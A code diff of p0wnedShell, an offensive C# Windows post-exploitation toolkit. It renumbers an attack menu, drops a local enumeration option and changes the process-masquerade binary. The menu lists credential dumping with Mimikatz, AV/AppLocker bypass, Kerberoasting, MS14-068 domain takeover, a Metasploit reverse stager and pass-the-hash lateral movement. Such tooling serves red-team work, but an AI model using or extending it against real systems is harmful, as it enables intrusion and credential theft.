@@ -1,4 +1,4 @@
-﻿/*******************************************************************\
+/*******************************************************************\
 *            ____                          _______ __         ____  *
 *     ____  / __ \_      ______  ___  ____/ / ___// /_  ___  / / /  *
 *    / __ \/ / / / | /| / / __ \/ _ \/ __  /\__ \/ __ \/ _ \/ / /   *
@@ -57,7 +57,7 @@ namespace p0wnedShell
     public static class p0wnedShellOpsec
     {
         public static bool AutoMasq = true;
-        public static string masqBinary = @"C:\Windows\regedit.exe";
+        public static string masqBinary = @"C:\Windows\notepad.exe";
         //public static string masqBinary = Environment.SystemDirectory + @\wbem\WmiPrvSE.exe";
         //public static string masqBinary = Environment.SystemDirectory + @"\WindowsPowerShell\v1.0\powershell.exe";
     }
@@ -243,45 +243,44 @@ namespace p0wnedShell
             Console.WriteLine(" 1. Use PowerView to gain network situational awareness on Windows Domains.");
             Console.WriteLine(" 2. Use Invoke-UserHunter and/or BloodHound to identify AD Attack Paths.");
             Console.WriteLine(" 3. Scan for IP-Addresses, HostNames and open Ports in your Network.");
-            Console.WriteLine(" 4. Execute ADRecon for a perfectly fine domain XLS-Dump (or csv if excel is not installed).");
-            Console.WriteLine(" 5. Execute Jaws for locan recon / privilege escalation vectors");
+            Console.WriteLine(" 4. Execute ADRecon for a domain XLS Export (or csv if excel is not installed).");
             Console.WriteLine();
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("[*] Code Execution:\n");
             Console.ResetColor();
-            Console.WriteLine(" 6. Reflectively load Mimikatz or ReactOS into Memory, bypassing AV/AppLocker.");
+            Console.WriteLine(" 5. Reflectively load Mimikatz or ReactOS into Memory, bypassing AV/AppLocker.");
             Console.WriteLine();
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("[*] Privilege Escalation:\n");
             Console.ResetColor();
-            Console.WriteLine(" 7. Use PowerUp tool to assist with local Privilege Escalation on Windows Systems.");
-            Console.WriteLine(" 8. Get a SYSTEM shell using EasySystem or Token Manipulation.");
-            Console.WriteLine(" 9. Inveigh a PowerShell based LLMNR/mDNS/NBNS Spoofer/Man-In-The-Middle tool.");
-            Console.WriteLine(" 10. Exploiting Group Policy Preference settings");
-            Console.WriteLine(" 11. Use Invoke-Kerberoast to get Crackable AD Service Account Hashes.");
-            Console.WriteLine(" 12. Attacking Active Directory using Mimikatz.");
+            Console.WriteLine(" 6. Use PowerUp tool to assist with local Privilege Escalation on Windows Systems.");
+            Console.WriteLine(" 7. Get a SYSTEM shell using EasySystem or Token Manipulation.");
+            Console.WriteLine(" 8. Inveigh a PowerShell based LLMNR/mDNS/NBNS Spoofer/Man-In-The-Middle tool.");
+            Console.WriteLine(" 9. Exploiting Group Policy Preference settings");
+            Console.WriteLine(" 10. Use Invoke-Kerberoast to get Crackable AD Service Account Hashes.");
+            Console.WriteLine(" 11. Attacking Active Directory using Mimikatz.");
             Console.WriteLine();
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("[*] Exploitation:\n");
             Console.ResetColor();
-            Console.WriteLine(" 13. Get SYSTEM Privileges using various Exploits/Vulnerabilities.");
-            Console.WriteLine(" 14. Own AD in 60 seconds using the MS14-068 Kerberos Vulnerability.");
+            Console.WriteLine(" 12. Get SYSTEM Privileges using various Exploits/Vulnerabilities.");
+            Console.WriteLine(" 13. Own AD in 60 seconds using the MS14-068 Kerberos Vulnerability.");
             Console.WriteLine();
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("[*] Command & Control and Lateral Movement:\n");
             Console.ResetColor();
-            Console.WriteLine(" 15. Execute Metasploit reversed https Stager or Inject as Shellcode.");
-            Console.WriteLine(" 16. Use WinRM, PsExec or SMB/WMI (PtH) to execute commands on remote systems.");
-            Console.WriteLine(" 17. PowerCat our PowerShell TCP/IP Swiss Army Knife.");
+            Console.WriteLine(" 14. Execute Metasploit reversed https Stager or Inject as Shellcode.");
+            Console.WriteLine(" 15. Use WinRM, PsExec or SMB/WMI (PtH) to execute commands on remote systems.");
+            Console.WriteLine(" 16. PowerCat our PowerShell TCP/IP Swiss Army Knife.");
             Console.WriteLine();
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("[*] Others:\n");
             Console.ResetColor();
-            Console.WriteLine(" 18. Execute (Offensive) PowerShell Scripts and Commands.");
+            Console.WriteLine(" 17. Execute (Offensive) PowerShell Scripts and Commands.");
             Console.WriteLine();
-            Console.WriteLine(" 19. Doing Domain Enumeration / Exporting all information to Text files in the current directory.");
+            Console.WriteLine(@" 18. Doing Domain Enumeration / Exporting all information to Text files in C:\TEMP\.");
             Console.WriteLine();
-            Console.WriteLine(" 20. Exit");
+            Console.WriteLine(" 19. Exit");
             Console.Write("\nEnter choice: ");
             var result = Console.ReadLine();
 
@@ -395,33 +394,30 @@ namespace p0wnedShell
                         Pshell.ADrecon();
                         break;
                     case 5:
-                        Pshell.Jaws();
-                        break;
-                    case 6:
                         Execution.Menu();
                         break;
-                    case 7:
+                    case 6:
                         Pshell.PowerUp();
                         break;
-                    case 8:
+                    case 7:
                         GetSystem.Menu();
                         break;
-                    case 9:
+                    case 8:
                         Inveigh.Menu();
                         break;
-                    case 10:
+                    case 9:
                         Pshell.GetGPPPassword();
                         break;
-                    case 11:
+                    case 10:
                         Roast.Menu();
                         break;
-                    case 12:
+                    case 11:
                         ADAttacks.Menu();
                         break;
-                    case 13:
+                    case 12:
                         Exploits.Menu();
                         break;
-                    case 14:
+                    case 13:
                         if (Arch == "x86")
                         {
                             Pshell.MS14_068();
@@ -435,19 +431,19 @@ namespace p0wnedShell
                             Console.ReadLine();
                         }
                         break;
-                    case 15:
+                    case 14:
                         p0wnedMeter.Menu();
                         break;
-                    case 16:
+                    case 15:
                         LatMovement.Menu();
                         break;
-                    case 17:
+                    case 16:
                         PowerCat.Menu();
                         break;
-                    case 18:
+                    case 17:
                         Pshell.InvokeShell();
                         break;
-                    case 19:
+                    case 18:
                         Pshell.PowerViewtofile();
                         break;
                     default:
@@ -457,7 +453,7 @@ namespace p0wnedShell
                         break;
                 }
 
-            } while (userInput != 20);
+            } while (userInput != 19);
 
             string TempFolder = Path.GetTempPath();
             if (File.Exists(TempFolder + "\\Amsi.dll"))
@@ -575,11 +571,10 @@ namespace p0wnedShell
             Console.Write("[+] Kevin Robertson: Powermad (New-MachineAccount, Invoke-DNSUpdate, Enable_ADIDNSNode)\n");
             Console.Write("[+] FuzzySecurity: Invoke-MS16-032 and Invoke-MS16-135\n");
             Console.Write("[+] hlldz: Invoke-Phant0m\n");
-            Console.Write("[+] 411Hall: Just another Windows(Enum) Script (jaws-enum)\n");
             Console.Write("[+] dafthack: DomainPasswordSpray (Invoke-DomainPasswordSpray, Get-DomainUserList\n");
             Console.Write("[+] Arvanaghi: SessionGopher (Invoke-Sessiongopher)\n");
             Console.Write("[+] peewpw: Invoke-WCMDump\n");
-            Console.Write("[+] SecureThisShit: WinPwn - automate recon and Exploitation (Online script gather Version)\n\n");
+            Console.Write("[+] SecureThisShit: WinPwn - automate recon and Exploitation (Needs an internet connection)\n\n");
             Console.Write("[+] Use Get-Help <ModuleName> for syntax usage and Have Fun :)\n");
             Console.Write("[+] Type mimikatz to reflective load Mimikatz from memory or easysystem to get a system shell\n");
             Console.ResetColor();
@@ -964,26 +959,7 @@ namespace p0wnedShell
             return;
         }
 
-        public static void Jaws()
-        {
-            try
-            {
-                string jawsscript = "jaws-enum";
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("\n[+] Doing some enumeration for the local system....\n");
-                Console.ResetColor();
-                Console.Write(RunPSCommand(jawsscript));
-                Console.WriteLine("Press Enter to Continue...");
-                Console.ReadLine();
-                Console.WriteLine("Output saved to jaws.txt. Press Enter to Continue...");
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(e.Message);
-            }
-
-        }
-            public static void ADrecon()
+        public static void ADrecon()
         {
             string[] toPrint = { "* So you want to generate a nice fresh AD-Report? Okidoki.          *" };
             Program.PrintBanner(toPrint);
@@ -1203,14 +1179,11 @@ namespace p0wnedShell
             {
                 pipeline.Commands.AddScript(Resources.Invoke_Encode());
             }
-            if (cmd.IndexOf("jaws-enum", 0, StringComparison.OrdinalIgnoreCase) != -1)
-            {
-                pipeline.Commands.AddScript(Resources.jaws_enum());
-            }
+            
 
-            pipeline.Commands.AddScript(Resources.Invoke_PowerView());
+            //pipeline.Commands.AddScript(Resources.Invoke_PowerView());
             pipeline.Commands.AddScript(Resources.Invoke_PowerUp());
-            //pipeline.Commands.AddScript(Resources.Invoke_PowerViewdev());
+            pipeline.Commands.AddScript(Resources.Invoke_PowerViewdev());
             pipeline.Commands.AddScript(cmd);
 
             //Prep PS for string output and invoke
